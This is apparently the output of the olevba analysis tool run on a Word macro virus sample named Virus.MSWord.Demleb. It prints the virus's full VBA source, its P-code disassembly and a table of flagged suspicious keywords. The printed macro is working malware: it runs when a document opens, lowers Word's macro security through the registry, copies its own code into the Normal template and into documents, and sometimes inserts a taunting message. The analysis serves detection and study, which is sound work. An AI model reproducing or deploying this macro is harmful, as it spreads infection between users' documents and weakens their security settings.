olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Demleb
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThissDocument.cls 
in file: Virus.MSWord.Demleb - OLE stream: 'Macros/VBA/ThissDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
Dim Response
' Если ты читаешь эти строки, значит ты уже немного шаришь
' в макросах, и это есть хорошо.  Ты спаситель мира, и только
' ты должен разобраться как он работает и удалить Его. Удачи!.
On Error Resume Next
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
'CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else
'CommandBars("Tools").Controls("Macro").Enabled = False
'Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1)
End If
Set ActDoc = ActiveDocument.VBProject.VBComponents.Item(1)
Set NormTemp = NormalTemplate.VBProject.VBComponents.Item(1)
NTColLn = NormTemp.CodeModule.CountOfLines
ADColLn = ActDoc.CodeModule.CountOfLines
BGN = 2
If ActDoc.Name <> "ThissDocument" Or ADColLn < 4 Then DoAD = True
If NormTemp.Name <> "ThissDocument" Or NTColLn < 4 Then DoNT = True
If DoNT <> True And DoAD <> True Then GoTo NoToInfect
'
If DoNT = True Then
NormTemp.Name = "ThissDocument"
If NTColLn > 0 Then NormTemp.CodeModule.DeleteLines 1, NTColLn
Do While ActDoc.CodeModule.Lines(1, 1) = ""
ActDoc.CodeModule.DeleteLines 1
Loop
NormTemp.CodeModule.AddFromString ("Private Sub Document_Close()")
Do While ActDoc.CodeModule.Lines(BGN, 1) <> ""
NormTemp.CodeModule.InsertLines BGN, ActDoc.CodeModule.Lines(BGN, 1)
BGN = BGN + 1
Loop
End If
'
Response = MsgBox("Дембель неизбежен?", vbYesNo, vbDefaultButton2, "ДМБ-2002")
If Response = vbYes Then
GoTo NoToInfect
Else
If DoAD = True Then
ActDoc.Name = "ThissDocument"
If ADColLn > 0 Then ActDoc.CodeModule.DeleteLines 1, ADColLn
Do While NormTemp.CodeModule.Lines(1, 1) = ""
NormTemp.CodeModule.DeleteLines 1
Loop
ActDoc.CodeModule.AddFromString ("Private Sub Document_Open()")
Do While NormTemp.CodeModule.Lines(BGN, 1) <> ""
ActDoc.CodeModule.InsertLines BGN, NormTemp.CodeModule.Lines(BGN, 1)
BGN = BGN + 1
Loop
End If
End If
NoToInfect:
'Destruct
If Year(Now) > 2001 And Rnd > 0.95 Then
Selection.EndKey wdStory
Selection.TypeParagraph
Selection.TypeText "Hi LameR": Selection.TypeParagraph
Selection.TypeText "The Extremist has you..": Selection.TypeParagraph
Selection.LanguageID = wdRussian
End If
'
If NTColLn <> 0 And ADColLn = 0 And (InStr(1, ActiveDocument.Name, "Документ") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Документ") = True) Then
ActiveDocument.Saved = True: End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Demleb
' ===============================================================================
' Module streams:
' Macros/VBA/ThissDocument - 5182 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	Dim 
' 	VarDefn Response
' Line #2:
' 	QuoteRem 0x0000 0x0039 " Если ты читаешь эти строки, значит ты уже немного шаришь"
' Line #3:
' 	QuoteRem 0x0000 0x003C " в макросах, и это есть хорошо.  Ты спаситель мира, и только"
' Line #4:
' 	QuoteRem 0x0000 0x003D " ты должен разобраться как он работает и удалить Его. Удачи!."
' Line #5:
' 	OnError (Resume Next) 
' Line #6:
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #7:
' 	QuoteRem 0x0000 0x003C "CommandBars("Macro").Controls("Security...").Enabled = False"
' Line #8:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #9:
' 	ElseBlock 
' Line #10:
' 	QuoteRem 0x0000 0x0036 "CommandBars("Tools").Controls("Macro").Enabled = False"
' Line #11:
' 	QuoteRem 0x0000 0x006B "Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1)"
' Line #12:
' 	EndIfBlock 
' Line #13:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set ActDoc 
' Line #14:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set NormTemp 
' Line #15:
' 	Ld NormTemp 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St NTColLn 
' Line #16:
' 	Ld ActDoc 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St ADColLn 
' Line #17:
' 	LitDI2 0x0002 
' 	St BGN 
' Line #18:
' 	Ld ActDoc 
' 	MemLd New 
' 	LitStr 0x000D "ThissDocument"
' 	Ne 
' 	Ld ADColLn 
' 	LitDI2 0x0004 
' 	Lt 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St DoAD 
' 	EndIf 
' Line #19:
' 	Ld NormTemp 
' 	MemLd New 
' 	LitStr 0x000D "ThissDocument"
' 	Ne 
' 	Ld NTColLn 
' 	LitDI2 0x0004 
' 	Lt 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St DoNT 
' 	EndIf 
' Line #20:
' 	Ld DoNT 
' 	LitVarSpecial (True)
' 	Ne 
' 	Ld DoAD 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo NoToInfect 
' 	EndIf 
' Line #21:
' 	QuoteRem 0x0000 0x0000 ""
' Line #22:
' 	Ld DoNT 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #23:
' 	LitStr 0x000D "ThissDocument"
' 	Ld NormTemp 
' 	MemSt New 
' Line #24:
' 	Ld NTColLn 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld NTColLn 
' 	Ld NormTemp 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' 	EndIf 
' Line #25:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActDoc 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	DoWhile 
' Line #26:
' 	LitDI2 0x0001 
' 	Ld ActDoc 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #27:
' 	Loop 
' Line #28:
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Paren 
' 	Ld NormTemp 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #29:
' 	Ld BGN 
' 	LitDI2 0x0001 
' 	Ld ActDoc 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0000 ""
' 	Ne 
' 	DoWhile 
' Line #30:
' 	Ld BGN 
' 	Ld BGN 
' 	LitDI2 0x0001 
' 	Ld ActDoc 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld NormTemp 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #31:
' 	Ld BGN 
' 	LitDI2 0x0001 
' 	Add 
' 	St BGN 
' Line #32:
' 	Loop 
' Line #33:
' 	EndIfBlock 
' Line #34:
' 	QuoteRem 0x0000 0x0000 ""
' Line #35:
' 	LitStr 0x0012 "Дембель неизбежен?"
' 	Ld vbYesNo 
' 	Ld vbDefaultButton2 
' 	LitStr 0x0008 "ДМБ-2002"
' 	ArgsLd MsgBox 0x0004 
' 	St Response 
' Line #36:
' 	Ld Response 
' 	Ld vbYes 
' 	Eq 
' 	IfBlock 
' Line #37:
' 	GoTo NoToInfect 
' Line #38:
' 	ElseBlock 
' Line #39:
' 	Ld DoAD 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #40:
' 	LitStr 0x000D "ThissDocument"
' 	Ld ActDoc 
' 	MemSt New 
' Line #41:
' 	Ld ADColLn 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld ADColLn 
' 	Ld ActDoc 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' 	EndIf 
' Line #42:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormTemp 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	DoWhile 
' Line #43:
' 	LitDI2 0x0001 
' 	Ld NormTemp 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #44:
' 	Loop 
' Line #45:
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	Paren 
' 	Ld ActDoc 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #46:
' 	Ld BGN 
' 	LitDI2 0x0001 
' 	Ld NormTemp 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0000 ""
' 	Ne 
' 	DoWhile 
' Line #47:
' 	Ld BGN 
' 	Ld BGN 
' 	LitDI2 0x0001 
' 	Ld NormTemp 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld ActDoc 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #48:
' 	Ld BGN 
' 	LitDI2 0x0001 
' 	Add 
' 	St BGN 
' Line #49:
' 	Loop 
' Line #50:
' 	EndIfBlock 
' Line #51:
' 	EndIfBlock 
' Line #52:
' 	Label NoToInfect 
' Line #53:
' 	QuoteRem 0x0000 0x0008 "Destruct"
' Line #54:
' 	Ld Now 
' 	ArgsLd Year 0x0001 
' 	LitDI2 0x07D1 
' 	Gt 
' 	Ld Rnd 
' 	LitR8 0x6666 0x6666 0x6666 0x3FEE 
' 	Gt 
' 	And 
' 	IfBlock 
' Line #55:
' 	Ld wdStory 
' 	Ld Selection 
' 	ArgsMemCall EndKey 0x0001 
' Line #56:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #57:
' 	LitStr 0x0008 "Hi LameR"
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' 	BoS 0x0000 
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #58:
' 	LitStr 0x0017 "The Extremist has you.."
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' 	BoS 0x0000 
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #59:
' 	Ld wdRussian 
' 	Ld Selection 
' 	MemSt LanguageID 
' Line #60:
' 	EndIfBlock 
' Line #61:
' 	QuoteRem 0x0000 0x0000 ""
' Line #62:
' 	Ld NTColLn 
' 	LitDI2 0x0000 
' 	Ne 
' 	Ld ADColLn 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0008 "Документ"
' 	FnInStr3 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #63:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #64:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0008 "Документ"
' 	FnInStr3 
' 	LitVarSpecial (True)
' 	Eq 
' 	Paren 
' 	ElseIfBlock 
' Line #65:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' 	BoS 0x0000 
' 	EndIfBlock 
' Line #66:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

